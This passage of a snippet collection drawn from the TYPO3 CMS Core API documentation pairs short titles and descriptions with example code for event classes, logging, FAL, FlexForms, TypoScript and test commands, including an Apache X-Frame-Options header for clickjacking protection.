CMS\nDESCRIPTION: Reference to the removed hook method that was replaced by the PSR-14 event system. The old implementation required returning an array or string, while the new event-based approach uses setDataStructure() method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Configuration/BeforeFlexFormDataStructureParsedEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['workspaces']['modifyDifferenceArray']\n```\n\n----------------------------------------\n\nTITLE: TYPO3 ModifyCacheLifetimeForPageEvent Class Definition\nDESCRIPTION: PHP class definition for handling page cache lifetime modifications in TYPO3 CMS. Provides methods to manage cache lifetime settings and access page-related information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/ModifyCacheLifetimeForPageEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass ModifyCacheLifetimeForPageEvent {\n    public function setCacheLifetime(int $cacheLifetime);\n    public function getCacheLifetime(): int;\n    public function getPageId(): int;\n    public function getPageRecord(): array;\n    public function getRenderingInstructions(): array;\n    public function getContext(): \\TYPO3\\CMS\\Core\\Context\\Context;\n}\n```\n\n----------------------------------------\n\nTITLE: Setting X-Frame-Options Header in Apache\nDESCRIPTION: This Apache configuration snippet showcases how to add the X-Frame-Options header to prevent Clickjacking attacks by restricting how pages can be embedded within frames. Ensure mod_headers is enabled in Apache. The directive SAMEORIGIN is used here, allowing framing only on the same origin. Alternatives include DENY and ALLOW-FROM uri for different security requirements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/FurtherActions.rst#2025-04-16_snippet_1\n\nLANGUAGE: Apache\nCODE:\n```\n\n   <IfModule mod_headers.c>\n     Header always append X-Frame-Options SAMEORIGIN\n   </IfModule>\n\n```\n\n----------------------------------------\n\nTITLE: Configuring XSL File for Individual Sitemap\nDESCRIPTION: TypoScript configuration for setting a custom XSL file for a specific individual sitemap in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_8\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_seo.config.<sitemapType>.sitemaps.<sitemap>.config.xslFile = EXT:my_extension/Resources/Public/CSS/mySpecificSitemap.xsl\n```\n\n----------------------------------------\n\nTITLE: Defining Blog Entity Class in TYPO3 CMS with Extbase\nDESCRIPTION: This class defines the Blog entity model which extends AbstractEntity. It establishes a one-to-many relationship between a blog and its posts using TYPO3's Extbase ObjectStorage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Annotation/Cascade.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage;\n\nclass Blog extends AbstractEntity\n{\n    /**\n     * The posts of this blog\n     * @var ObjectStorage<Post>\n     */\n    public $posts;\n}\n```\n\n----------------------------------------\n\nTITLE: Debugging with Fluid Comment ViewHelper\nDESCRIPTION: Shows how to use the Fluid Comment ViewHelper to temporarily disable problematic or broken Fluid syntax during debugging.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_25\n\nLANGUAGE: html\nCODE:\n```\n<f:comment>\n    <x:someBrokenFluid>\n</f:comment>\n```\n\n----------------------------------------\n\nTITLE: Configuring Specific Backend Path in TYPO3 PHP\nDESCRIPTION: This snippet demonstrates how to configure a specific path for the TYPO3 backend entry point in the additional.php configuration file. It sets the backend entry point to a custom path.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/BackendEntryPoint/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['entryPoint'] = '/my-specific-path';\n```\n\n----------------------------------------\n\nTITLE: Implementing External Link Validation in TYPO3 CMS (PHP)\nDESCRIPTION: This class checks for external links that incorrectly point to a local domain (example.org). It processes found URLs, adds them to a broken link repository if they match the local domain, and includes details about the content record where the link was found.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent/AddToBrokenLinkRepository.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal readonly class CheckExternalLinksToLocalPagesEventListener\n{\n    private const LOCAL_DOMAIN = 'example.org';\n    private const TABLE_NAME = 'tt_content';\n    private const FIELD_NAME = 'bodytext';\n\n    /**\n     * @param array<mixed> $record\n     * @param array<mixed> $results\n     */\n    private function matchUrl(string $foundUrl, array $record, array &$results): void\n    {\n        if (str_contains($foundUrl, self::LOCAL_DOMAIN)) {\n            $this->addItemToBrokenLinkRepository($record, $foundUrl);\n            $results[] = $record;\n        }\n    }\n\n    /**\n     * @param array<string, scalar> $record\n     */\n    private function addItemToBrokenLinkRepository(array $record, string $foundUrl): void\n    {\n        $link = [\n            'record_uid' => $record['uid'],\n            'record_pid' => $record['pid'],\n            'language' => $record['sys_language_uid'],\n            'field' => self::FIELD_NAME,\n            'table_name' => self::TABLE_NAME,\n            'url' => $foundUrl,\n            'last_check' => time(),\n            'link_type' => 'external',\n        ];\n        $this->brokenLinkRepository->addBrokenLink($link, false, [\n            'errorType' => 'exception',\n            'exception' => 'Do not link externally to ' . self::LOCAL_DOMAIN,\n            'errno' => 1661517573,\n        ]);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Session and Cache Tables in TYPO3\nDESCRIPTION: Tables used for storing session information and system data in TYPO3, including frontend and backend sessions tables, system registry, and log tables.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/DatabaseStructure/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nfe_sessions\n```\n\nLANGUAGE: sql\nCODE:\n```\nbe_sessions\n```\n\nLANGUAGE: sql\nCODE:\n```\nsys_registry\n```\n\nLANGUAGE: sql\nCODE:\n```\nsys_log\n```\n\n----------------------------------------\n\nTITLE: PHP GitHub Link Builder\nDESCRIPTION: Frontend link builder for rendering GitHub links.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/CustomLinkBrowser.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n    public function build(array &$linkDetails, string $linkText, string $target, array $conf): array\n    {\n        $baseUrl = $this->configuration['baseUrl'] ?? 'https://github.com';\n        $issueTrackerPath = $this->configuration['issueTrackerPath']\n            ?? '/typo3/typo3/issues/';\n        $url = $baseUrl . $issueTrackerPath . $linkDetails['url']['issue'];\n        return [\n            0 => [\n                'url' => $url,\n                'target' => $target,\n                'class' => 'github-link',\n                'title' => $linkText,\n            ],\n            1 => $linkText ?: $url,\n        ];\n    }\n```\n\n----------------------------------------\n\nTITLE: Basic Date Formatting in TYPO3 Fluid\nDESCRIPTION: Demonstrates two equivalent ways to format dates using the f:format.date ViewHelper in TYPO3 Fluid templates. The first uses tag syntax while the second uses inline notation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Fluid.rst#2025-04-16_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n<f:format.date date=\"{dateObject}\" format=\"d.m.Y\" />\n<!-- or -->\n{dateObject -> f:format.date(format: 'd.m.Y')}\n```\n\n----------------------------------------\n\nTITLE: Registering Event Listeners with PHP Attribute (TYPO3 v13+)\nDESCRIPTION: The `AsEventListener` PHP attribute is used to tag a PHP class as an event listener in TYPO3 version 13 and later. This eliminates the need to manually configure event listeners in the `Services.yaml` file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/_includes/EventsAttributeAddedNew.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\nnamespace TYPO3\\CMS\\Core\\Attribute;\n\n/**\n * This is a dummy class for documentation purposes.\n * In TYPO3 v13+, \\TYPO3\\CMS\\Core\\Attribute\\AsEventListener is available\n */\n#[\n    \\Attribute(\\Attribute::TARGET_CLASS | \\Attribute::IS_REPEATABLE)\n]\nfinal class AsEventListener\n{\n    /**\n     * @param string $event The event to listen to.\n     * @param string|null $method The method to call when the event is triggered.\n     *                           If null, the __invoke method will be called.\n     * @param int $priority The priority of the listener. Higher numbers mean earlier execution.\n     */\n    public function __construct(\n        public string $event,\n        public ?string $method = null,\n        public int $priority = 0\n    )\n    {\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Configuring DatabaseWriter in TYPO3\nDESCRIPTION: Configuration for the DatabaseWriter in TYPO3, showing how to set up logging for a specific component to write logs to a custom database table 'tx_examples_log'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Writers/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['T3docs']['Examples']['Controller']['writerConfiguration'] = [\n    // configuration for WARNING severity, including all\n    // levels with higher severity (ERROR, CRITICAL, EMERGENCY)\n    \\TYPO3\\CMS\\Core\\Log\\LogLevel::WARNING => [\n        // add a DatabaseWriter\n        \\TYPO3\\CMS\\Core\\Log\\Writer\\DatabaseWriter::class => [\n            // specify a table name for the log entries\n            'logTable' => 'tx_examples_log'\n        ]\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Including RST Documentation Headers\nDESCRIPTION: RST documentation headers and index directives for the TYPO3 ModuleProvider documentation page.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleProviderAPI.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: Backend modules; ModuleProvider\n..  _backend-module-provider:\n\n==============\nModuleProvider\n==============\n\n..  _backend-module-provider-api:\n\nModuleProvider API\n==================\n```\n\n----------------------------------------\n\nTITLE: PHP Class Declaration Example\nDESCRIPTION: Illustrates a typical PHP class declaration within a TYPO3 extension.  The class name should be identical to the file name and written in upper camel case.  The class can extend other classes or implement interfaces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/FileStructure.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nclass SomeClass extends AbstractBackend implements BackendInterface\n    {\n        // ...\n    }\n```\n\n----------------------------------------\n\nTITLE: Copying Files in TYPO3 FAL\nDESCRIPTION: Demonstrates how to copy a file to a new location using FAL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$storage = $resourceFactory->getDefaultStorage();\n$file = $storage->getFile('path/to/file.jpg');\n$targetFolder = $storage->getFolder('path/to/target/');\n$file->copyTo($targetFolder);\n```\n\n----------------------------------------\n\nTITLE: Using BeforePageLanguageOverlayEvent in TYPO3 CMS\nDESCRIPTION: The BeforePageLanguageOverlayEvent is fired when TYPO3 is about to perform language overlay operations on page records. It allows modification of page records before the language overlay is applied.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Domain/BeforePageLanguageOverlayEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class BeforePageLanguageOverlayEvent\n{\n    /**\n     * A list of (already preprocessed) language overlay items, indexed by uid.\n     * These records can be modified, but adding or removing keys from the records array is not supported.\n     * @var array<int, array<string, mixed>>\n     */\n    private array $records;\n\n    /**\n     * @param array<int, array<string, mixed>> $records\n     */\n    public function __construct(array $records)\n    {\n        $this->records = $records;\n    }\n\n    /**\n     * @return array<int, array<string, mixed>>\n     */\n    public function getRecords(): array\n    {\n        return $this->records;\n    }\n\n    /**\n     * @param array<int, array<string, mixed>> $records\n     */\n    public function setRecords(array $records): void\n    {\n        $this->records = $records;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Frontend TypoScript Template Configuration\nDESCRIPTION: TypoScript configuration for template paths and content element rendering\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.contentElement.templateRootPaths.200 = EXT:examples/Resources/Private/Templates/ContentElements/\n```\n\nLANGUAGE: typoscript\nCODE:\n```\ntt_content.myextension_basiccontent =< lib.contentElement\ntt_content.myextension_basiccontent {\n   templateName = BasicContent\n}\n```\n\n----------------------------------------\n\nTITLE: Flushing TYPO3 Cache in Composer-based Installation\nDESCRIPTION: This command flushes the TYPO3 cache in a Composer-based installation. It uses the TYPO3 CLI script located in the vendor directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/_includes/CliCacheFlush.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 cache:flush\n```\n\n----------------------------------------\n\nTITLE: Including ReStructuredText Image for User Impersonation Button\nDESCRIPTION: This snippet includes a ReStructuredText directive to insert an image showing the 'Switch to user' button in the Backend Users module.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/OverviewOfUsers/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. include:: /Images/AutomaticScreenshots/AccessControl/SimulateUserButton.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Loading Third-Party and Fixture Extensions in PHP for TYPO3 Functional Test\nDESCRIPTION: Shows how to load third-party extensions and fixture extensions for a functional test case.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nprotected array $testExtensionsToLoad = [\n    'typo3conf/ext/base_extension',\n    'typo3conf/ext/some_extension',\n];\nprotected array $pathsToLinkInTestInstance = [\n    'typo3conf/ext/some_extension/Tests/Functional/Fixtures/Extensions/test_extension' => 'typo3conf/ext/test_extension',\n];\n```\n\n----------------------------------------\n\nTITLE: Initializing UserSessionManager in TYPO3 CMS (PHP)\nDESCRIPTION: This code demonstrates how to retrieve a UserSessionManager instance using its static create() factory method. The login type parameter specifies whether to create a backend ('BE') or frontend ('FE') session manager.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/Sessions/_UserSessionManager.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Session\\UserSessionManager;\n\n$loginType = 'BE'; // or 'FE' for frontend\n$userSessionManager = UserSessionManager::create($loginType);\n```\n\n----------------------------------------\n\nTITLE: Creating FIRST_INSTALL file for TYPO3\nDESCRIPTION: Commands to create the FIRST_INSTALL file required for GUI-based installation process across different environments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/Install.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ntouch example-project-directory/public/FIRST_INSTALL\n```\n\nLANGUAGE: powershell\nCODE:\n```\necho $null >> public/FIRST_INSTALL\n```\n\nLANGUAGE: bash\nCODE:\n```\nddev exec touch public/FIRST_INSTALL\n```\n\n----------------------------------------\n\nTITLE: Configuring Plugin Settings with FlexForms in TYPO3\nDESCRIPTION: This XML configuration defines a FlexForm structure for plugin settings in a TYPO3 extension. It creates a numeric input field for specifying the maximum number of items to display per page, with a default value of 3 and a field size of 2 characters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Configuration/PluginSettings.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<T3DataStructure>\n    <sheets>\n        <sDEF>\n            <ROOT>\n                <sheetTitle>Options</sheetTitle>\n                <type>array</type>\n                <el>\n                    <settings.itemsPerPage>\n                        <label>Max. number of items to display per page</label>\n                        <config>\n                            <type>number</type>\n                            <size>2</size>\n                            <default>3</default>\n                        </config>\n                    </settings.itemsPerPage>\n                </el>\n            </ROOT>\n        </sDEF>\n    </sheets>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: Referencing AfterFileAddedToIndexEvent Class in PHP\nDESCRIPTION: Shows the fully qualified class name for the AfterFileAddedToIndexEvent in TYPO3 CMS Core.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileAddedToIndexEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\AfterFileAddedToIndexEvent\n```\n\n----------------------------------------\n\nTITLE: Referencing Database Tables in TYPO3\nDESCRIPTION: Examples of SQL table names referenced in TYPO3. These include system tables like 'be_sessions', 'sys_registry', as well as managed tables with required fields like 'uid' and 'pid'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/DatabaseStructure/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nbe_sessions\n```\n\nLANGUAGE: sql\nCODE:\n```\nsys_registry\n```\n\nLANGUAGE: sql\nCODE:\n```\nuid\n```\n\nLANGUAGE: sql\nCODE:\n```\npid\n```\n\nLANGUAGE: sql\nCODE:\n```\npages\n```\n\n----------------------------------------\n\nTITLE: Example of Incorrect Namespace Transformation\nDESCRIPTION: Shows how an incorrectly formatted extension key would be transformed into a namespace (example to avoid).\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Namespaces/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: none\nCODE:\n```\nWeird-nameExamples\n```\n\n----------------------------------------\n\nTITLE: PHP File Type Reference\nDESCRIPTION: PHP type reference for File instances used in TYPO3's File Abstraction Layer (FAL).\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Events.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nFile\n```\n\n----------------------------------------\n\nTITLE: Adding SQL Definitions for Custom Fields in TYPO3\nDESCRIPTION: This SQL snippet defines the database structure for the custom fields added to the fe_users table. It's typically placed in the ext_tables.sql file of the extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendingTca/Examples/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE fe_users (\n\ttx_examples_options int(11) DEFAULT '0' NOT NULL,\n\ttx_examples_special varchar(255) DEFAULT '' NOT NULL\n);\n```\n\n----------------------------------------\n\nTITLE: Logical Expression Line Break Example\nDESCRIPTION: Demonstrates how to properly format long logical expressions in TYPO3, by placing the logical operator at the beginning of the next line.  This enhances readability when dealing with complex conditional statements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/GeneralRequirementsForPhpFiles.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nif ($GLOBALS['TYPO3_CONF_VARS']['SYS']['curlUse'] == '1'\n    && preg_match('/^(?:http|ftp)s?|s(?:ftp|cp):/', $url)\n) {\n```\n\n----------------------------------------\n\nTITLE: Accessing Site Language in TypoScript\nDESCRIPTION: This snippet shows how to access site language properties in TypoScript using the 'siteLanguage' prefix. It demonstrates accessing the navigation title and language direction.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UseSiteInTypoScript.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\npage.10 = TEXT\npage.10.data = siteLanguage:navigationTitle\npage.10.wrap = This is the title of the current site language: |\n```\n\nLANGUAGE: typoscript\nCODE:\n```\npage.10 = TEXT\npage.10.dataWrap = The current site language direction is {siteLanguage:direction}\n```\n\n----------------------------------------\n\nTITLE: Configuring FileLockStrategy Directory in TYPO3\nDESCRIPTION: Example of how to configure a custom lock file directory for the FileLockStrategy in TYPO3's additional configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LockingApi/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Locking\\FileLockStrategy;\n\n// The directory specified here must exist und must be a subdirectory of `Environment::getProjectPath()`\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['locking']['strategies'][FileLockStrategy::class]['lockFileDir'] = 'mylockdir';\n```\n\n----------------------------------------\n\nTITLE: Registering Custom DateTime Type Converter in TYPO3\nDESCRIPTION: Demonstrates how to register a custom type converter for DateTime conversion using TYPO3's Services.yaml configuration. Specifies target type, priority, and source types for conversion.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/TypeConverter.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\Property\\TypeConverter\\MyCustomDateTimeConverter:\n    tags:\n      - name: extbase.type_converter\n        priority: 10\n        target: \\DateTime\n        sources: int,string\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition for AfterGroupsResolvedEvent in TYPO3\nDESCRIPTION: PHP class definition for handling group resolution events in TYPO3 authentication system. Contains methods for retrieving and manipulating user group information, source database tables, and user data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterGroupsResolvedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Authentication\\Event;\n\nclass AfterGroupsResolvedEvent {\n    public function getSourceDatabaseTable(): string\n    {\n        // Returns 'be_groups' or 'fe_groups' depending on context\n    }\n\n    public function getGroups(): array\n    {\n        // Returns list of group records including sub groups\n    }\n\n    public function setGroups(array $groups)\n    {\n        // Sets the list of group records\n    }\n\n    public function getOriginalGroupIds(): array\n    {\n        // Returns list of group uids directly attached to the user\n    }\n\n    public function getUserData(): array\n    {\n        // Returns full user record with all fields\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining the AfterFolderCopiedEvent Class in TYPO3 Core\nDESCRIPTION: This PHP class represents an event in TYPO3 that fires after a folder is copied to the Resource Storage or Driver. It provides methods to access the original folder, the target parent folder, and the resulting target folder. Custom listeners can use this event to analyze contents or add custom permissions to folders automatically.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFolderCopiedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFolderCopiedEvent\n{\n    public function getFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Returns the original folder that was copied\n    }\n\n    public function getTargetParentFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Returns the parent folder where the folder was copied to\n    }\n\n    public function getTargetFolder(): ?\\TYPO3\\CMS\\Core\\Resource\\FolderInterface\n    {\n        // Returns the resulting target folder or null\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Unit Tests in TYPO3 Projects\nDESCRIPTION: Bash command to execute PHPUnit for unit tests in TYPO3 projects using a specific configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_6\n\nLANGUAGE: Bash\nCODE:\n```\nvendor/bin/phpunit \\\n    -c Build/phpunit/UnitTests.xml\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeLoadedPageTsConfigEvent Class in PHP for TYPO3 CMS Core\nDESCRIPTION: This snippet defines the BeforeLoadedPageTsConfigEvent class in the TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event namespace. It includes methods for managing global page TSconfig before they are loaded from other sources.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeLoadedPageTsConfigEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event;\n\nclass BeforeLoadedPageTsConfigEvent\n{\n    public function getTsConfig(): array\n    {\n        // Implementation not shown\n    }\n\n    public function addTsConfig(string $tsConfig): void\n    {\n        // Implementation not shown\n    }\n\n    public function setTsConfig(array $tsConfig): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Error Message for InvalidPasswordHashException in TYPO3 CMS\nDESCRIPTION: An example of the error message displayed when the system encounters an InvalidPasswordHashException due to unsupported password hashing mechanisms.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PasswordHashing/Troubleshooting.rst#2025-04-16_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n#1533818591 TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\InvalidPasswordHashException\nNo implementation found that handles given hash. This happens if the\nstored hash uses a mechanism not supported by current server.\n```\n\n----------------------------------------\n\nTITLE: Defining ShouldUseCachedPageDataIfAvailableEvent Class in TYPO3 CMS Frontend\nDESCRIPTION: This class defines an event that allows listeners to disable the loading of cached page data when a page is requested. It doesn't affect situations where caching is disabled or no cached version of a page exists.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/ShouldUseCachedPageDataIfAvailableEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass ShouldUseCachedPageDataIfAvailableEvent\n{\n    public function getController(): \\TYPO3\\CMS\\Frontend\\Controller\\TypoScriptFrontendController\n    {\n        // Implementation not shown\n    }\n\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n        // Implementation not shown\n    }\n\n    public function shouldUseCachedPageData(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function setShouldUseCachedPageData(bool $shouldUseCachedPageData)\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 Warning Email Address Configuration\nDESCRIPTION: This code snippet shows how to access the configuration variable that stores the email address for security warnings in TYPO3. This address receives notifications about failed login attempts.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/GlobalTypo3Options.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['warning_email_addr']\n```\n\n----------------------------------------\n\nTITLE: Basic ext_tables.php Structure in TYPO3\nDESCRIPTION: This code snippet demonstrates a basic structure for the `ext_tables.php` file in a TYPO3 extension. The file is automatically loaded and does not require manual registration. The example includes a check for the `TYPO3` constant to ensure it's running within a TYPO3 environment.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtTables.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndefined('TYPO3') or die();\n\n// Your code here\n\n```\n\n----------------------------------------\n\nTITLE: Example Directory Structure for Custom Translation Server in TYPO3\nDESCRIPTION: This example demonstrates the actual directory structure for a specific extension named 'my_extension'. It shows how language packages for German, French, and Italian should be organized on the custom translation server.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/TranslationServer/Custom.rst#2025-04-16_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nhttps://example.org/typo3-packages/\n`-- m\n    `-- y\n        `-- my_extension-l10n\n            |-- my_extension-l10n-de.zip\n            |-- my_extension-l10n-fr.zip\n            `-- my_extension-l10n-it.zip\n```\n\n----------------------------------------\n\nTITLE: Defining PolicyMutatedEvent Class Methods and Attributes in PHP\nDESCRIPTION: Defines the PolicyMutatedEvent 